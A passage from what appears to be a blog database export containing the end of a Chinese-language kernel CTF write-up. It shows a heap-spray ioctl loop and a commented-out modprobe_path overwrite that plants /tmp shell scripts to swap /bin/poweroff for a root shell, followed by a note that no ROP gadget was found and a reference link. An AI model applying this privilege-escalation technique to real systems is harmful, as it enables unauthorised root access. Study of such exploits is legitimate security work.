class=\"hljs-number\">0x100</span>;i++)&#123; ioctl(spray[i], <span class=\"hljs-number\">0x41414141</span>, <span class=\"hljs-number\">0x42424242</span>); &#125;\n\n        <span class=\"hljs-comment\">/*</span>\n<span class=\"hljs-comment\">        buf[0] = modprobe_path;</span>\n<span class=\"hljs-comment\">        write(fd, buf, 8);</span>\n<span class=\"hljs-comment\">        char *path = &quot;/tmp/x&quot;;</span>\n<span class=\"hljs-comment\">        ioctl(fd, CHECKSUMZ_IOCTL_RENAME, (uint64_t *)path);</span>\n<span class=\"hljs-comment\"></span>\n<span class=\"hljs-comment\">        system(&quot;echo &#x27;#!/bin/sh\\n/bin/sh&#x27; &gt; /tmp/sh&quot;);</span>\n<span class=\"hljs-comment\">        system(&quot;chmod +x /tmp/sh&quot;);</span>\n<span class=\"hljs-comment\">        system(&quot;echo &#x27;#!/bin/sh\\nmv /tmp/sh /bin/poweroff&#x27; &gt; /tmp/x&quot;);</span>\n<span class=\"hljs-comment\">        system(&quot;chmod +x /tmp/x&quot;);</span>\n<span class=\"hljs-comment\">        system(&quot;echo -ne &#x27;\\\\xff\\\\xff\\\\xff\\\\xff&#x27; &gt; /tmp/dummy&quot;);</span>\n<span class=\"hljs-comment\">        system(&quot;chmod +x /tmp/dummy&quot;);</span>\n<span class=\"hljs-comment\">        system(&quot;/tmp/dummy&quot;);</span>\n<span class=\"hljs-comment\">        */</span>\n&#125;</code></pre>\n<p>没找到合适的gadget来写rop</p>\n<p>参考</p>\n<p><a href=\"https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/\">https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/</a></p>\n"}],"PostAsset":[],"PostCategory":[],"PostTag":[{"post_id":"cm8gv4pnr0000x12e8iz6cibg","tag_id":"cm8gxwkyb0000gw2e8rzubjqp","_id":"cm8gyd8gb0000572ecxb27nzu"}],"Tag":[{"name":"Kernel","_id":"cm8gxwkyb0000gw2e8rzubjqp"}]}}